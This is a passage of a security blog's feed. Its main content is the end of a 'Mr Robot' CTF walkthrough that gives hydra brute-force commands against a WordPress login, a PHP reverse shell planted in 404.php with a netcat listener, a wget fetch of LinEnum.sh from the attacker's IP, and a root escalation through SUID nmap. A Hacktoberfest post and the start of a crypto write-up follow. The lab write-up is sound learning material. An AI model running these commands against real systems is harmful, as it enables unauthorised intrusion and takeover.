+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wget $url/key-1-of-3.txt $url/fsocity.dic
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ls
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;key-1-of-3.txt fsocity.dic
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;cat key-1-of-3.txt ****************&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Now that we have our first key, let analyse the second file downloaded.
+The second file &lt;code&gt;fsocity.dic&lt;/code&gt; is a text file that contains a list of text, so most probably it&amp;rsquo;s a wordlist.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cat fsocity.dic | wc -l
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;858160&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;There are a lot of lines and using sort we can see that there are also a lot of duplicates. So let us sort the list and remove all the duplicates and append the list in a new file.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sort fsocity.dic | uniq &amp;gt; new_list.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cat new_list | wc -l
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;11451&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We have massively reduce our wordlist. Now let us find an endpoint to utilise the wordlist.
+On our previous scan we have discovered that the site has a wordpress login. Let us try to login into the site using our wordlist.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Wordpress has a default feature that if not disabled shows different error message for correct and incorrect username. If a user exists and if password is incorrect then it gives a hint that the password for the user is wrong. We can leverage this feature to enumerate for users and usernames that exist.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&#34;/images/mrRobot/wordpress_login.png&#34; alt=&#34;wordpress_login&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Trying &lt;code&gt;admin&lt;/code&gt; as the username we get an invalid username, so let us enumerate the username to find a user for the site.
+The site probably doesn&amp;rsquo;t have any rate limiting so we can bruteforce the correct username using a tool like burp intruder or hydra.
+Since I only have the community version of burp it would probably be too slow to find the username, so Hydra it is.&lt;/p&gt;
+&lt;p&gt;Here is a good explanation of using Hydra for &lt;a href=&#34;https://theblackthreat.medium.com/brute-force-login-using-hydra-4ad7ddf863f6&#34;&gt;bruteforcing website&lt;/a&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;gt; hydra -L new_list.txt -p password 10.10.103.189 http-post-form &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/wp-login.php:log=^USER^&amp;amp;pwd=^PWD^:Invalid username&amp;#34;&lt;/span&gt; -t &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt; -vV
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;DATA&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; attacking http-post-form://10.10.103.189:80/wp-login.php:log&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;^USER^&amp;amp;pwd&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;^PWD^:Invalid username
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;VERBOSE&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Resolving addresses ... &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;VERBOSE&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; resolving &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;ATTEMPT&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; target 10.10.103.189 - login &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Elliot&amp;#34;&lt;/span&gt; - pass &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt; - &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; of &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;child 0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0/0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;80&lt;span style=&#34;color:#f92672&#34;&gt;][&lt;/span&gt;http-post-form&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; host: 10.10.103.189   login: Elliot   password: password
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From our hydra enumeration, we find the user &lt;code&gt;Elliot&lt;/code&gt; after about going through 5000 lines of the wordlist.
+Now that we have the username, lets repeat the same process using our wordlist on the password field.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;gt; hydra -l Elliot -P new_list.txt 10.10.103.189 http-post-form &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/wp-login.php:log=^USER^&amp;amp;pwd=^PWD^:The password you&amp;#34;&lt;/span&gt; -t &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt; -vV
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After going through about 5000 lines again we get a hit on the password, i.e &lt;code&gt;ER28–0652&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Now we login to the site using the wordpress credentials we enumerated.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Our goal after getting access to the wordpress is to establish a shell so that we can access the system and obtain the keys. One way to gain a reverse shell is to change the php code of the 404.php page and insert code that will connect to our system.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Here is the &lt;a href=&#34;https://github.com/jbarcia/Web-Shells/blob/master/laudanum/wordpress/templates/php-reverse-shell.php&#34;&gt;php shell code&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Go to &lt;code&gt;appearance&amp;gt;editor&amp;gt;404 Template&lt;/code&gt; and replace the content of the 404 page with the shell code.&lt;/p&gt;
+&lt;p&gt;A snippet of what the &lt;code&gt;404.php&lt;/code&gt; should look like:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/mrRobot/404php.png&#34; alt=&#34;404php&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Now update the 404.php page and start a netcat listener on your host system to wait for the connection from the shell.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;gt; nc -lvnp &lt;span style=&#34;color:#ae81ff&#34;&gt;1337&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;listening on 0.0.0.0 &lt;span style=&#34;color:#ae81ff&#34;&gt;1337&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can trigger the 404.php page by going to any non-existent page in the website.
+Lets trigger the 404 by going to &lt;code&gt;http://10.10.103.189/errorpage&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;We get a reverse connection to our netcat.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Let us spawn a more stable shell using python.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;gt; python -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;daemon@linux: cd /home
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;daemon@linux: ls
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;daemon@linux: robot
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;daemon@linux: ls -l
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ls -l
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;total &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-r-------- &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; robot robot &lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt; Nov &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2015&lt;/span&gt; key-2-of-3.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rw-r--r-- &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; robot robot &lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt; Nov &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2015&lt;/span&gt; password.raw-md5
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can see the second key &lt;code&gt;key-2-of-3.txt&lt;/code&gt; in the robots home directory but since our current user is daemon, and since only the robot user has read access to it and we can&amp;rsquo;t view the contents of the file. We can also see a &lt;code&gt;password.raw-md5&lt;/code&gt; file and on inspecting the file we can see that it contains a md5 hash and it can be deduced that it is the hash of the password for the user robot.  We probably have to decode the hash and login to robot user and then read the second key.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Instead, let us download &lt;a href=&#34;https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh&#34;&gt;linEnum.sh&lt;/a&gt; which is a shell script that can enumerate and detect interesting files that can lead to privilege escalation. This script can detect easy privilege escalation vectors like SUID and other misconfigured permissions etc.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;After downloading, let us start a python server on our localhost so that we can download the &lt;code&gt;LinEnum.sh&lt;/code&gt; from our compromised shell.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 -m http.server &lt;span style=&#34;color:#ae81ff&#34;&gt;7575&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now on our reverse shell, let us move to the /tmp folder where we have read write access. Download the &lt;code&gt;linEnum.sh&lt;/code&gt; from our python server and then set execute permission and then run the script.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;daemon@linux:/home/robot$ cd /tmp
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;daemon@linux:/home/robot$ wget http://10.17.30.241:7575/linEnum.sh
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;daemon@linux:/home/robot$ chmod +x linEnum.sh
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;daemon@linux:/home/robot$ ./linEnum.sh
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Here is the output of &lt;code&gt;linEnum.sh&lt;/code&gt; with an interesting discovery.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/mrRobot/linEnum.png&#34; alt=&#34;linEnum&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We can observe that the script found a possible SUID file in &lt;code&gt;/usr/local/bin/nmap&lt;/code&gt;. Let us try to gain root privilege using this file.&lt;/p&gt;
+&lt;p&gt;We can refer to &lt;a href=&#34;https://gtfobins.github.io/gtfobins/nmap/&#34;&gt;GTFObins/nmap&lt;/a&gt; to try to execute shell commands.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;daemon@linux:/tmp$ /usr/local/bin/nmap --interactive
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/local/bin/nmap --interactive
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Starting nmap V. 3.81 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; http://www.insecure.org/nmap/ &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Welcome to Interactive Mode -- press h &amp;lt;enter&amp;gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; help
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nmap&amp;gt; !sh
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;!sh
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;gt; whoami
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;Voila! We now have root access to the server and can read the contents of any file.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;After gaining root access, we can easily view the contents of both the keys.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;daemon@linux:/tmp$ cd /home/robot
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;daemon@linux:/home/robot$ cat key-2-of-3.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;daemon@linux:/home/robot$ *******************
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;daemon@linux:/home/robot$ cd /root
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;daemon@linux:/root$ cat key-3-of-3.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;daemon@linux:/home/robot$ *******************
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;That&amp;rsquo;s it. Happy Hacking&lt;/p&gt;
+&lt;/blockquote&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>Hacktoberfest 2022</title>
+      <link>/posts/hacktoberfest2022/</link>
+      <pubDate>Wed, 22 Feb 2023 00:00:00 +0000</pubDate>
+      
+      <guid>/posts/hacktoberfest2022/</guid>
+      <description>Hacktoberfest 2022 was an annual event that took place in October 2022, and was designed to encourage people to contribute to open source projects. The event was sponsored by DigitalOcean, GitHub and many more notable tech companies, and aimed to promote collaboration and community involvement in the world of software development. This year&amp;rsquo;s event was the biggest yet, with a record-breaking number of developers participating from all over the world.</description>
+      <content>&lt;p&gt;&lt;img src=&#34;/images/hacktoberfest2022/holopins.png&#34; alt=&#34;digitalpins&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://hacktoberfest.com&#34;&gt;Hacktoberfest&lt;/a&gt; 2022 was an annual event that took place in October 2022, and was designed to encourage people to contribute to open source projects. The event was sponsored by &lt;a href=&#34;https://digitalocean.com&#34;&gt;DigitalOcean&lt;/a&gt;, &lt;a href=&#34;https://github.com&#34;&gt;GitHub&lt;/a&gt; and many more notable tech companies, and aimed to promote collaboration and community involvement in the world of software development. This year&amp;rsquo;s event was the biggest yet, with a record-breaking number of developers participating from all over the world.&lt;/p&gt;
+&lt;p&gt;One of the new exciting aspects of Hacktoberfest 2022 was the addition of planting trees as a reward. In collaboration with the nonprofit organization &lt;a href=&#34;https://tree-nation.com&#34;&gt;tree-nation&lt;/a&gt;, participants who completed the challenge of submitting four pull requests to any participating open source project on GitHub had the option of planting a tree in one of several locations around the world. This was a great way to give back to the environment and help combat climate change.&lt;/p&gt;
+&lt;p&gt;To participate in Hacktoberfest 2022, participants had to register on the official Hacktoberfest website, and submit four pull requests to any participating open source project on GitHub. A pull request was a proposal to merge changes to an open source project, and it could be as simple as fixing a typo or as complex as adding a new feature. Participants had the entire month of October to complete the challenge and earn the rewards.&lt;/p&gt;
+&lt;p&gt;As in previous years, participants who completed the challenge were eligible for some great rewards, including a limited edition Hacktoberfest t-shirt, stickers, and the option to plant a tree. The t-shirt and stickers were a great way to show off your participation in the event and promote open source development, while the tree-planting option provided a meaningful way to give back to the environment.&lt;/p&gt;
+&lt;p&gt;In 2022 all participants whose pull requests were merge also received &lt;a href=&#34;https://holopin.io&#34;&gt;holopin&lt;/a&gt; which is a digital badge that can be use to showcase skill and achievements. The image at the top of the page are the digital pins I have received duing hacktoberfest 2023. I have also received by hacktoberfest 2022 swags in the form of t-shirt and stickers, that was sent to me through DHL partnered with Indian post.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/hacktoberfest2022/swag.jpg&#34; alt=&#34;swag1&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;tshirt with stickers&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/hacktoberfest2022/swag2.jpg&#34; alt=&#34;swag2&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;stickers&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Hacktoberfest 2022 was also an excellent opportunity to learn new skills and gain experience working on real-world projects. It provided a chance to connect with other developers from around the world and collaborate on open source projects that were making a difference in the world. Many open source projects had issues tagged as &amp;ldquo;Hacktoberfest&amp;rdquo; to make it easier for participants to find projects to contribute to.&lt;/p&gt;
+&lt;p&gt;In conclusion, Hacktoberfest 2022 was an exciting event that encouraged collaboration and community involvement in the world of software development. The addition of planting trees as a reward was a great way to give back to the environment and help combat climate change. The event provided an excellent opportunity for developers of all levels to learn new skills, gain experience working on real-world projects, and connect with other developers from around the world. We look forward to seeing what Hacktoberfest 2023 has in store!&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>[HTB] BabyEncryption writeup</title>
+      <link>/posts/babyenryption/</link>
+      <pubDate>Tue, 14 Feb 2023 00:00:00 +0000</pubDate>
+      
+      <guid>/posts/babyenryption/</guid>
+      <description>This is my write up for Baby Encryption challenge in hackthebox. This challenge was fairly easy and just tested our our scripting skill and logical thinking.
+Initial analysis In this cryptography challenge we are provided with two files namely, chall.py and msg.enc. The content of these files are:
+chall.py
+import string from secret import MSG def encryption(msg): ct = [] for char in msg: ct.append((123 * char + 18) % 256) return bytes(ct) ct = encryption(MSG) f = open(&amp;#39;.</description>
+      <content>&lt;p&gt;This is my write up for &lt;a href=&#34;https://app.hackthebox.com/challenges/babyencryption&#34;&gt;Baby Encryption&lt;/a&gt; challenge in hackthebox. This challenge was fairly easy and just tested our our scripting skill and logical thinking.&lt;/p&gt;
+&lt;h1 id=&#34;initial-analysis&#34;&gt;Initial analysis&lt;/h1&gt;
+&lt;p&gt;In this cryptography challenge we are provided with two files namely, &lt;code&gt;chall.py&lt;/code&gt; and &lt;code&gt;msg.enc&lt;/code&gt;.
+The content of these files are:&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;chall.py&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; string
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; secret &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; MSG
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;encryption&lt;/span&gt;(msg):
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ct &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; char &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; msg:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        ct&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append((&lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; char &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; bytes(ct)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ct &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; encryption(MSG)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;f &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./msg.enc&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;w&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(ct&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hex())
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;msg.enc&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;6e0a9372ec49a3f6930ed8723f9df6f6720ed8d89dc4937222ec7214d89d1e0e352ce0aa6ec82bf622227bb70e7fb7352249b7d893c493d8539dec8fb7935d490e7f9d22ec89b7a322ec8fd80e7f8921
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can observe that the &lt;code&gt;chall.py&lt;/code&gt; python takes some &lt;code&gt;secret&lt;/code&gt; and then encrypts the message by multiplying &lt;code&gt;123&lt;/code&gt; to each character, then adding &lt;code&gt;18&lt;/code&gt; and finally taking the mod of the number with &lt;code&gt;256&lt;/code&gt;.
+Bytes of the whole array is returned and then finally &lt;code&gt;hex()&lt;/code&gt; to form the contents of &lt;code&gt;msg.enc&lt;/code&gt;. So to obtain the flag for the challenge we just have to find the &lt;code&gt;secret&lt;/code&gt; from the &lt;code&gt;msg.enc&lt;/code&gt; by reversing the encryption algorithm.&lt;/p&gt;
+&lt;p&gt;Due to the presence of the modulus operator, it is hard to backtrack the algorithm and reverse the encryption algorithm. So instead we will try to match each ascii characters with its encrypted form to get the desired flag. Our approach will involve bruteforcing every character with the &lt;code&gt;msg.enc&lt;/code&gt; and appending the correct character to an array.&lt;/p&gt;
+&lt;p&gt;So here is our python code for finding the flag:&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;decryption.py&lt;/strong&gt;&lt;/p&gt;
